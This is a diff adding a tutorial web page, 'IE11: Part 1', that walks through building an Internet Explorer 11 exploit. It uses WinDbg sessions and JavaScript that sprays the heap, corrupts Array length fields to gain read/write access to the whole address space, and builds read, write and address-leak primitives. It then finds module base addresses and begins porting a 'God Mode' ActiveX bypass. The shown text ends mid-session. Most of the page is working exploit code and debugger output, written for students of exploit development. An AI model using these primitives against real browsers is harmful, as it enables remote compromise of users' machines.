@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IE11: Part 1</title>
+    <link rel="stylesheet" href="styles.css">
+
+    <link rel="stylesheet" href="highlight/styles/stackoverflow-dark.min.css">
+    <script src="highlight/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<div class="inner-content"><header class="page-header"><h1 class="page-title">IE11: Part 1</h1></header><div class="page-content"><p>For this exploit I’m using a <span style="color: #00ccff;">VirtualBox VM</span> with <span style="color: #00ccff;">Windows 7 64-bit SP1</span> and the version of <span style="color: #00ccff;">Internet Explorer 11</span> downloaded from here:</p><p style="padding-left: 30px;"><a href="http://filehippo.com/download_internet_explorer_windows_7_64/tech/">http://filehippo.com/download_internet_explorer_windows_7_64/tech/</a></p><h2>EmulateIE9</h2><p>Finding a <span style="color: #00ccff;">UAF</span> bug for <span style="color: #00ccff;">IE 11</span> for this chapter was very hard because <em>security researchers</em> tend to omit important technical details in their articles. As a student of exploit development I wish I had access to such information.</p><p>Anyway, the UAF bug I found needs the following line:</p>
+
+<pre><code class="language-html">&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+</code></pre>
+
+<p>Unfortunately, when we’re emulating <span style="color: #00ccff;">IE 9</span>, <span style="color: #00ff00;">Int32Arrays</span> are not available, so the method we used for <span style="color: #00ccff;">IE 10</span> (see <a href="ie10-reverse-engineering-ie.html">article</a>), although pretty general, is not applicable here. It’s time to look for another method!</p><h2>Array</h2><p>We saw how <span style="color: #00ff00;">Arrays</span> are laid out in memory in IE 10. Things are very similar in IE 11, but there’s an interesting difference. Let’s create an <span style="color: #00ff00;">Array</span> with the following simple code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  var a = new Array((0x10000 - 0x20)/4);
+  for (var i = 0; i &lt; a.length; ++i)
+    a[i] = 0x123;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>We saw that in IE 10 <span style="color: #00ff00;">Arrays</span> were created by calling <span style="color: #00ff00;">jscript9!Js::JavascriptArray::NewInstance</span>. Let’s put a breakpoint on it:</p><pre class="ignore:true">bp jscript9!Js::JavascriptArray::NewInstance</pre><p>If we reload the page in IE 11 nothing happens. Let’s try with the constructor:</p><pre class="ignore:true">0:002&gt; bc *
+0:002&gt; x jscript9!*javascriptarray::javascriptarray*
+6f5c2480          jscript9!Js::JavascriptArray::JavascriptArray (&lt;no parameter info&gt;)
+6f5c7f42          jscript9!Js::JavascriptArray::JavascriptArray (&lt;no parameter info&gt;)
+6f4549ad          jscript9!Js::JavascriptArray::JavascriptArray (&lt;no parameter info&gt;)
+6f47e091          jscript9!Js::JavascriptArray::JavascriptArray (&lt;no parameter info&gt;)
+0:002&gt; bm jscript9!*javascriptarray::javascriptarray*
+  1: 6f5c2480          @!"jscript9!Js::JavascriptArray::JavascriptArray"
+  2: 6f5c7f42          @!"jscript9!Js::JavascriptArray::JavascriptArray"
+  3: 6f4549ad          @!"jscript9!Js::JavascriptArray::JavascriptArray"
+  4: 6f47e091          @!"jscript9!Js::JavascriptArray::JavascriptArray"</pre><p>Here I got a weird error in <span style="color: #00ccff;">WinDbg</span>:</p><pre class="ignore:true">Breakpoint 1's offset expression evaluation failed.
+Check for invalid symbols or bad syntax.
+WaitForEvent failed
+eax=00000000 ebx=00838e4c ecx=00000000 edx=00000000 esi=00839b10 edi=00000000
+eip=7703fc92 esp=05d57350 ebp=05d573d0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!ZwUnmapViewOfSection+0x12:
+7703fc92 83c404          add     esp,4</pre><p>Let me know if you know why this happens. To avoid this error, you can set the 4 breakpoints by hand:</p><pre class="ignore:true">bp 6f5c2480
+bp 6f5c7f42
+bp 6f4549ad
+bp 6f47e091</pre><p>When we resume the execution and allow blocked content in IE, the second breakpoint is triggered and the <span style="color: #00ccff;">stack trace</span> is the following:</p><pre class="ignore:true">0:007&gt; k 8
+ChildEBP RetAddr  
+0437bae0 6da6c0c8 jscript9!Js::JavascriptArray::JavascriptArray
+0437baf4 6d9d6120 jscript9!Js::JavascriptNativeArray::JavascriptNativeArray+0x13
+0437bb24 6da6bfc6 jscript9!Js::JavascriptArray::New&lt;int,Js::JavascriptNativeIntArray&gt;+0x112
+0437bb34 6da6bf9c jscript9!Js::JavascriptLibrary::CreateNativeIntArray+0x1a
+0437bbf0 6da6c13b jscript9!Js::JavascriptNativeIntArray::NewInstance+0x81    &lt;--------------------
+0437bff8 6d950aa3 jscript9!Js::InterpreterStackFrame::Process+0x48e0
+0437c11c 04cd0fe9 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x1e8
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+0437c128 6d94ceab 0x4cd0fe9</pre><p>Let’s delete all the breakpoints and put a breakpoint on <span style="color: #00ff00;">JavascriptNativeIntArray::NewInstance</span>:</p><pre class="ignore:true">0:007&gt; bc *
+0:007&gt; bp jscript9!Js::JavascriptNativeIntArray::NewInstance</pre><p>Reload the page and when the breakpoint is triggered, press <span style="color: #00ff00;">Shift+F11</span> to return from the call. <span style="color: #00ff00;">EAX</span> should now point to the <span style="color: #00ff00;">JavascriptNativeIntArray</span> object:</p><p>
+<a href="images/pic_56.png"><img src="images/pic_56.png" alt="pic_56" width="1600" height="978"></a>
+<br> It seems that the buffer for the <span style="color: #00ff00;">Array</span> has space for just <span style="color: #00ff00;">4</span> elements. Or maybe that <span style="color: #00ff00;">4</span> elements are the header for the buffer?&nbsp; When the <span style="color: #00ff00;">Array</span> grows, a bigger buffer should be allocated and thus the pointer to the buffer in the <span style="color: #00ff00;">Array</span> object should change. So, let’s put a hardware breakpoint on the <span style="color: #00ff00;">buf_addr</span> field:</p><pre class="ignore:true">ba w4 @eax+14</pre><p>When we resume the execution, the hardware breakpoint is triggered and the stack trace looks like this:</p><pre class="ignore:true">0:007&gt; k 8
+ChildEBP RetAddr  
+0437bac0 6daf49a2 jscript9!Js::JavascriptArray::AllocateHead&lt;int&gt;+0x32
+0437baf0 6daf4495 jscript9!Js::JavascriptArray::DirectSetItem_Full&lt;int&gt;+0x28d
+0437bb44 6d94d9a3 jscript9!Js::JavascriptNativeIntArray::SetItem+0x187        &lt;------------------------
+0437bb70 03a860a6 jscript9!Js::CacheOperators::CachePropertyRead&lt;1&gt;+0x54
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+0437c0c8 6da618a7 0x3a860a6
+0437c104 6d950d93 jscript9!InterpreterThunkEmitter::GetNextThunk+0x4f
+0437c128 6d94ceab jscript9!Js::FunctionBody::EnsureDynamicInterpreterThunk+0x77
+0437c168 6d94d364 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x88</pre><p>As we expected, the <span style="color: #00ff00;">Array</span> grows when elements are added through <span style="color: #00ff00;">jscript9!Js::JavascriptNativeIntArray::SetItem</span>. The new address of the buffer is <span style="color: #00ff00;">039e0010h</span>. Now resume the execution, stop the execution again and have a look at the buffer at <span style="color: #00ff00;">039e0010h</span>:</p><p>
+<a href="images/pic_57.png"><img src="images/pic_57.png" alt="pic_57" width="691" height="871"></a>
+<br> As we can see, the integers <span style="color: #00ff00;">0x123</span> are written without any kind of encoding in the buffer. In IE 10 we would have had <span style="color: #00ff00;">0x247</span>, i.e. <span style="color: #00ff00;">0x123*2 + 1</span>. The only caveat is that the integers are signed. Let’s see what happens when we write to the <span style="color: #00ff00;">Array</span> a value bigger than the biggest positive integer number. Let’s spray the heap to find one of the buffers more easily:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  var a = new Array();
+  for (var i = 0; i &lt; 0x1000; ++i) {
+    a[i] = new Array((0x10000 - 0x20)/4);
+    for (var j = 0; j &lt; a[i].length; ++j)
+      a[i][j] = 0x123;
+    a[i][0] = 0x80000000;
+  }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>In WinDbg, go to an address like <span style="color: #00ff00;">9000000h</span> or use <span style="color: #00ccff;">VMMap</span> to determine a suitable address. This time you’ll see something familiar:</p><p>
+<a href="images/pic_58.png"><img src="images/pic_58.png" alt="pic_58" width="1600" height="969"></a>
+<br> This is the exact situation we had in IE 10: the numbers are encoded (<span style="color: #00ff00;">2*N + 1</span>) and first element, which should be the number <span style="color: #00ff00;">0x80000000</span>, points to a <span style="color: #00ff00;">JavascriptNumber</span> object. Is there a way to write <span style="color: #00ff00;">0x80000000</span> directly? Yes: we need to find the negative number whose <span style="color: #00ccff;">2-complement</span> representation is <span style="color: #00ff00;">0x80000000</span>. This number is</p><pre class="ignore:true">-(0x100000000 - 0x80000000) = -0x80000000</pre><p>Let’s try it:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  CollectGarbage();
+  var a = new Array();
+  for (var i = 0; i &lt; 0x1000; ++i) {
+    a[i] = new Array((0x10000 - 0x20)/4);
+    for (var j = 0; j &lt; a[i].length; ++j)
+      a[i][j] = 0x123;
+    a[i][0] = -0x80000000;
+  }
+  alert("Done");
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>As you can see, we get exactly what we wanted:</p><p>
+<a href="images/pic_59.png"><img src="images/pic_59.png" alt="pic_59" width="669" height="436"></a>
+<br> We can conclude that in IE 11 an <span style="color: #00ff00;">Array</span> stores <span style="color: #00ccff;">32-bit signed integers</span> directly without any particular encoding. As soon as something different than a 32-bit signed integer is written into the <span style="color: #00ff00;">Array</span>, all the integers are encoded as <span style="color: #00ff00;">2*N + 1</span> just as in IE 10. This means that as long as we’re careful, we can use a normal <span style="color: #00ff00;">Array</span> as an <span style="color: #00ff00;">Int32Array</span>. This is important because, as we said in the section <em>EmulateIE9</em>, <span style="color: #00ff00;">Int32Arrays</span> won’t be available.</p><h2>Reading/Writing beyond the end</h2><p>In IE 10 the length of an <span style="color: #00ff00;">Array</span> appears both in the <span style="color: #00ff00;">Array</span> object and in the header of the <span style="color: #00ff00;">Array</span> buffer. Let’s see if things have changed in IE 11. Let’s use the following code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  var a = new Array((0x10000 - 0x20)/4);
+  for (var i = 0; i &lt; 7; ++i)
+    a[i] = 0x123;  
+ 
+  alert("Done");
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>To determine the address of the <span style="color: #00ff00;">Array</span>, we can use the following breakpoint:</p><pre class="ignore:true">bp jscript9!Js::JavascriptNativeIntArray::NewInstance+0x85 ".printf \"new Array: addr = 0x%p\\n\",eax;g"</pre><p>Here’s a picture of the <span style="color: #00ff00;">Array</span> object and its buffer:</p><p>
+<a href="images/pic_60.png"><img src="images/pic_60.png" alt="pic_60" width="1065" height="859"></a>
+<br> Let’s use this code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  var array_len = (0x10000 - 0x20)/4;
+  var a = new Array(array_len);
+  for (var i = 0; i &lt; 7; ++i)
+    a[i] = 0x123;
+ 
+  alert("Modify the array length");
+ 
+  alert(a[array_len]);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>We want to modify the <span style="color: #00ff00;">Array</span> length so that we can read and write beyond the real end of the <span style="color: #00ff00;">Array</span>. Let’s load the <span style="color: #00ccff;">HTML</span> page in IE and when the first alert message appears, go in WinDbg and overwrite the length field in the <span style="color: #00ff00;">Array</span> object with <span style="color: #00ff00;">0x20000000</span>. When we close the alert box, a second alert box appears with the message <span style="color: #00ff00;">undefined</span>. This means that we couldn’t read beyond the end of the <span style="color: #00ff00;">Array</span>.</p><p>Now let’s try to modify the “<span style="color: #00ff00;">Array actual length</span>” field in the header of the <span style="color: #00ff00;">Array</span> buffer (from <span style="color: #00ff00;">7</span> to <span style="color: #00ff00;">0x20000000</span>): same result.</p><p>Finally, modify the “<span style="color: #00ff00;">Buffer length</span>” field in the header of the <span style="color: #00ff00;">Array</span> buffer (from <span style="color: #00ff00;">0x3ff8</span> to <span style="color: #00ff00;">0x20000000</span>): same result. But if we modify all the three length fields it works! Is it really necessary to modify all the three values by hand? An <span style="color: #00ff00;">Array</span> grow when we write at an index which is beyond the current length of the <span style="color: #00ff00;">Array</span>. If the buffer is too small, a big enough buffer is allocated. So what happens if we modify just the “<span style="color: #00ff00;">Buffer length</span>” field and then write at an index of the <span style="color: #00ff00;">Array</span> which is beyond the current length of the <span style="color: #00ff00;">Array</span>? If our logic doesn’t fail us, IE should grow the <span style="color: #00ff00;">Array</span> without touching the buffer because IE thinks that the buffer is big enough (but we know we faked its size). In other words, IE should update the other two length fields as a consequence of writing to the <span style="color: #00ff00;">Array</span> beyond the current end of the <span style="color: #00ff00;">Array</span>.</p><p>Let’s update our code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  var array_len = (0x10000 - 0x20)/4;
+  var a = new Array(array_len);
+  for (var i = 0; i &lt; 7; ++i)
+    a[i] = 0x123;
+ 
+  alert("Modify the \"Buffer length\" field");
+  a[array_len + 0x100] = 0;
+  alert(a[array_len]);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>We load the HTML page in IE and when the first alert box appears we modify the “<span style="color: #00ff00;">Buffer length</span>” field in the buffer header. Then we resume execution and close the alert box. IE might crash because we could overwrite something important after the end of the <span style="color: #00ff00;">Array</span>. In that case, repeat the whole process.</p><p>Now, when the second alert box appears, have another look at the <span style="color: #00ff00;">Array</span> object and at its buffer header:</p><p>
+<a href="images/pic_61.png"><img src="images/pic_61.png" alt="pic_61" width="666" height="840"></a>
+<br> Perfect! Again, understand that if we hadn’t altered the “<span style="color: #00ff00;">Buffer length</span>” field of the buffer, a new buffer of length at least <span style="color: #00ff00;">0x40f9</span> would have been allocated, and we wouldn’t have got read/write access to memory beyond the end of the <span style="color: #00ff00;">Array</span>.</p><h2>Whole address space read/write access</h2><p>We want to acquire read/write access to the whole address space. To do so, we need to spray the heap with many <span style="color: #00ff00;">Arrays</span>, modify the “<span style="color: #00ff00;">Buffer length</span>” field in the buffer header of one <span style="color: #00ff00;">Array</span>, locate the modified <span style="color: #00ff00;">Array</span> and, finally, use it to modify all three length fields of another <span style="color: #00ff00;">Array</span>. We’ll use this second <span style="color: #00ff00;">Array</span> to read and write wherever we want.</p><p>Here’s the <a href="code/ie11_code1.zip">javascript code</a>:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function () {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+      a[i][0] = 0;
+    }
+    
+    magic_addr = 0xc000000;
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    
+    // Locate the modified Array.
+    var idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+      alert("Can't find the modified Array");
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    alert("Done");
+  })();
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>The header size for the buffer of an <span style="color: #00ff00;">Array</span> is <span style="color: #00ff00;">0x20</span> because there is a <span style="color: #00ff00;">0x10</span>-byte heap allocation header and a <span style="color: #00ff00;">0x10</span>-byte buffer header.</p><p><span style="color: #00ff00;">magic_addr</span> is the address where the <span style="color: #00ff00;">Array</span> whose length we want to modify is located. Feel free to change that value.</p><p>To determine the index of the modified <span style="color: #00ff00;">Array</span> we consider each <span style="color: #00ff00;">Array</span> in order of allocation and try to modify the first element of the following <span style="color: #00ff00;">Array</span>. We can use <span style="color: #00ff00;">a[i]</span> to modify the first element of <span style="color: #00ff00;">a[i+1]</span> if and only if <span style="color: #00ff00;">a[i]</span> is the modified array and the buffer of <span style="color: #00ff00;">a[i+1]</span> is located right after the buffer of <span style="color: #00ff00;">a[i]</span> in memory. If <span style="color: #00ff00;">a[i]</span> is not the modified <span style="color: #00ff00;">Array</span>, its buffer will grow, i.e. a new buffer will be allocated. Note that if we determined that <span style="color: #00ff00;">a[idx]</span> is the modified <span style="color: #00ff00;">Array</span>, then it’s guaranteed that the buffer of <span style="color: #00ff00;">a[idx+1]</span> hasn’t been reallocated and is still located right after the buffer of <span style="color: #00ff00;">a[idx]</span>.</p><p>Now we should be able to read/write in the address space <span style="color: #00ff00;">[base_addr, 0xffffffff]</span>, but what about<span style="color: #00ff00;"> [0, base_addr]</span>? That is, can we read/write before the buffer of<span style="color: #00ff00;"> a[idx+1]</span>? Probably, IE assumes that the base addresses and the lengths of the <span style="color: #00ff00;">Arrays</span> are correct and so doesn’t check for overflows. Let’s say we want to read the dword at <span style="color: #00ff00;">0x400000</span>. We know that <span style="color: #00ff00;">base_addr</span> is <span style="color: #00ff00;">0xc010000</span>.</p><p>Let’s suppose that IE computes the address of the element to read as</p><pre class="ignore:true">base_addr + index*4 = 0xc010000 + index*4</pre><p>without making sure that<span style="color: #00ff00;"> index*4 &lt; 2^32 – base_addr</span>. Then, we can determine the index to read the dword at <span style="color: #00ff00;">0x400000</span> as follows:</p><pre class="ignore:true">0xc010000 + index*4 = 0x400000 (mod 2^32)
+index = (0x400000 - 0xc010000)/4 (mod 2^32)
+index = (0x400000 + 0 - 0xc010000)/4 (mod 2^32)
+index = (0x400000 + 2^32 - 0xc010000)/4 (mod 2^32)
+index = 0x3d0fc000 (mod 2^32)</pre><p>The notation</p><pre class="ignore:true">a = b (mod N)</pre><p>means</p><pre class="ignore:true">a = b + k*N for some integer k.</pre><p>For instance,</p><pre class="ignore:true">12 = 5 (mod 7)</pre><p>because</p><pre class="ignore:true">12 = 5 + 1*7</pre><p>Working with 32 bits in presence of overflows is like working in <span style="color: #00ff00;">mod 2^32</span>. For instance,</p><pre class="ignore:true">-5 = 0 - 5 = 2^32 - 5 = 0xfffffffb</pre><p>because, in <span style="color: #00ff00;">mod 2^32</span>, <span style="color: #00ff00;">0</span> and <span style="color: #00ff00;">2^32</span> are equivalent (<span style="color: #00ff00;">0 = 2^32 – 1*2^32</span>).</p><p>To recap, if IE just checks that <span style="color: #00ff00;">index &lt; array_len</span> (which is <span style="color: #00ff00;">0x3fffffff</span> in our case) and doesn’t do any additional check on potential overflows, then we should be able to read and write in <span style="color: #00ff00;">[0,0xffffffff]</span>. Here’s the implementation of the functions <span style="color: #00ff00;">read</span> and <span style="color: #00ff00;">write</span>:</p>
+
+<pre><code class="language-js">    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+</code></pre>
+    
+    <p>We’ve already noted that <span style="color: #00ff00;">Array</span> contains signed 32-bit integers. Since I prefer to work with <span style="color: #00ccff;">unsigned 32-bit integers</span>, I perform some conversions between <em>signed</em> and <em>unsigned</em> integers.</p><p>But we haven’t checked if all this works yet! Here’s the <a href="code/ie11_code2.zip">full code</a>:</p>
+    
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function () {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+      a[i][0] = 0;
+    }
+    
+    magic_addr = 0xc000000;
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    
+    // Locate the modified Array.
+    var idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+      alert("Can't find the modified Array");
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+    
+    alert("Write a number at the address " + (base_addr - 0x10000).toString(16));
+    var num = read(base_addr - 0x10000);
+    alert("Did you write the number " + num.toString(16) + "?");
+    
+    alert("Done");
+  })();
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>To check if everything works fine, follow the instructions. Try also to write a number <span style="color: #00ff00;">&gt;= 0x80000000</span> such as <span style="color: #00ff00;">0x87654321</span>. Lucky for us, everything seems to be working just fine!</p><h2>get_addr function</h2><p>The <span style="color: #00ff00;">get_addr</span> function is very easy to write:</p>
+
+<pre><code class="language-js">    function get_addr(obj) {
+      a[idx+2][0] = obj;
+      return read(base_addr + 0x10000);
+    }
+ 
+    alert(get_addr(ActiveXObject).toString(16));
+</code></pre>
+    
+    <p>Note that we can’t assign obj to <span style="color: #00ff00;">a[idx+1][0]</span> because this would make IE crash. In fact, <span style="color: #00ff00;">a[idx+1]</span> would become a mix <span style="color: #00ff00;">Array</span> and IE would try to encode the dwords of the entire space address! We can’t use <span style="color: #00ff00;">a[idx]</span> for the same reason and we can’t use <span style="color: #00ff00;">a[idx-1]</span> or previous <span style="color: #00ff00;">Arrays</span> because their buffers were reallocated somewhere else (remember?). So, <span style="color: #00ff00;">a[idx+2]</span> seems like a good candidate.</p><h2>God Mode</h2><p>Now we need to port the <em>God Mode</em> from IE 10 to IE 11. Let’s start with the first few lines:</p>
+    
+<pre><code class="language-js">    // At 0c0af000 we can read the vfptr of an Int32Array:
+    //   jscript9!Js::TypedArray&lt;int&gt;::`vftable' @ jscript9+3b60
+    jscript9 = read(0x0c0af000) - 0x3b60;
+    
+    .
+    .
+    .
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable'
+    //      v
+    //   70792248 0c012b40 00000000 00000003
+    //   73b38b9a 00000000 00574230 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x58b9a
+    var addr = get_addr(document.createElement("div"));
+    alert(addr.toString(16));
+    return;
+    mshtml = read(addr + 0x10) - 0x58b9a;
+</code></pre>
+    
+    <p>When the alert box pops up, examine the memory at the indicated address and you should have all the information to fix the code. Here’s the fixed code:</p>
+    
+<pre><code class="language-js">    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable' = jscript9 + 0x2d50
+    //      v
+    //  04ab2d50 151f1ec0 00000000 00000000
+    //  6f5569ce 00000000 0085f5d8 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x1569ce
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x2d50;
+    mshtml = read(addr + 0x10) - 0x1569ce;
+</code></pre>
+    
+    <p>Now let’s analyze <span style="color: #00ff00;">jscript9!ScriptSite::CreateActiveXObject</span>, if still present. First of all, add this simple line of code:</p>
+    
+<pre><code class="language-js">new ActiveXObject("ADODB.Stream");
+</code></pre>
+    
+    <p>Then, load the page in IE and add a breakpoint on <span style="color: #00ff00;">jscript9!ScriptSite::CreateActiveXObject</span>. When the breakpoint is triggered, step through the code until you reach a call to <span style="color: #00ff00;">CreateObjectFromProgID</span>:</p><pre class="ignore:true">04c05a81 e84a000000      call    jscript9!ScriptSite::CreateObjectFromProgID (04c05ad0)</pre><p>Step into it (<span style="color: #00ff00;">F11</span>) and then step until you reach <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true">04c05b4c 8d45e8          lea     eax,[ebp-18h]
+04c05b4f 50              push    eax
+04c05b50 e86c020000      call    jscript9!ScriptEngine::CanCreateObject (04c05dc1)
+04c05b55 85c0            test    eax,eax
+04c05b57 0f84f4150400    je      jscript9!ScriptSite::CreateObjectFromProgID+0x116 (04c47151)</pre><p>Step into it (<span style="color: #00ff00;">F11</span>) and step until you get to the virtual call:</p><pre class="ignore:true">04c05df0 8d55f8          lea     edx,[ebp-8]
+04c05df3 6a00            push    0
+04c05df5 6a00            push    0
+04c05df7 6a10            push    10h
+04c05df9 ff7508          push    dword ptr [ebp+8]
+04c05dfc 8b08            mov     ecx,dword ptr [eax]
+04c05dfe 6a04            push    4
+04c05e00 52              push    edx
+04c05e01 6800120000      push    1200h
+04c05e06 50              push    eax
+04c05e07 ff5110          call    dword ptr [ecx+10h]  ds:002b:702bcda8={MSHTML!TearoffThunk4 (6f686f2b)}  &lt;---------------
+04c05e0a 85c0            test    eax,eax
+04c05e0c 7811            js      jscript9!ScriptEngine::CanCreateObject+0x5e (04c05e1f)
+04c05e0e f645f80f        test    byte ptr [ebp-8],0Fh
+04c05e12 6a00            push    0
+04c05e14 58              pop     eax
+04c05e15 0f94c0          sete    al
+04c05e18 5e              pop     esi
+04c05e19 8be5            mov     esp,ebp
+04c05e1b 5d              pop     ebp
+04c05e1c c20400          ret     4</pre><p>In IE 10 we went to great lengths to return from <span style="color: #00ff00;">CanCreateObject</span> with a non null <span style="color: #00ff00;">EAX</span> and a null <span style="color: #00ff00;">EDI</span>. But as we can see, in IE 11 there is no <span style="color: #00ff00;">pop edi</span>. Does it mean that we can just call the function <span style="color: #00ccff;">epilog</span> (which doesn’t use <span style="color: #00ff00;">leave</span> anymore, by the way)?</p><p>Let’s gather some useful information:</p><pre class="ignore:true">0:007&gt; ln ecx
